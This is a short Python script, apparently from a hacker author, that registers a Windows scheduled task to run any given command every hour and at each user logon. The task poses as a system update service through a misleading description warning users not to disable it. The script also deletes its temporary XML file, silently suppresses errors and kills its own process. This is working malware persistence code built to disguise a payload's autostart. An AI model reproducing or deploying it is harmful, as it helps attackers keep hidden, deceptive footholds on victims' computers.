# Date: 10/22/2017
# Author: Ethical-H4CK3R
# Description: Delete, Create, Execute A Tasks On Windows

import os 
import signal
from getpass import getuser

xml = '''
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">

    <RegistrationInfo>        
        <Description>Keeps your system up to date. If this task is disabled or stopped, your system will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work.</Description>
    </RegistrationInfo>

    <Triggers>
        <CalendarTrigger>
            <StartBoundary>1992-01-01T04:00</StartBoundary>
            <Repetition>
                <Interval>PT1H</Interval>
            </Repetition>
            <ScheduleByDay>
                <DaysInterval>1</DaysInterval>
            </ScheduleByDay>
        </CalendarTrigger>

	<LogonTrigger>
            <StartBoundary>1992-01-01T04:00</StartBoundary>
	    <Enabled>true</Enabled>
	    <UserId>{0}</UserId>
        </LogonTrigger>
    </Triggers>

    <Settings>
        <Priority>2</Priority>
        <Enabled>true</Enabled>
        <AllowStartOnDemand>true</AllowStartOnDemand>
        <AllowHardTerminate>true</AllowHardTerminate>
        <StartWhenAvailable>true</StartWhenAvailable>
        <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>   
        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
        <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd></IdleSettings>        
    </Settings>

    <Actions>
        <Exec>
            <Command>{1}</Command>
        </Exec>
    </Actions>
</Task>'''

class Task(object):
 ''' Create & Delete Tasks On Windows '''

 def __init__(self, path, taskname):
  self.xml = '{}{}{}.xml'.format(os.path.abspath(os.path.expanduser('~')), os.path.sep, taskname)
  self.taskname = taskname
  self.path = path 
  
 def run(self):
  with open(self.xml, 'w') as f:f.write(xml.format(getuser(), self.path))
  self.create()
  os.remove(self.xml)
  os.kill(os.getpid(), signal.SIGABRT)
     
 def create(self):
  try:os.popen3('schtasks /Create /TN {} /XML {} /F'.format(self.taskname, self.xml))   
  except:pass 

 @staticmethod
 def delete(taskname):
  try:os.popen3('schtasks /Delete /TN {} /F'.format(taskname))
  except:pass
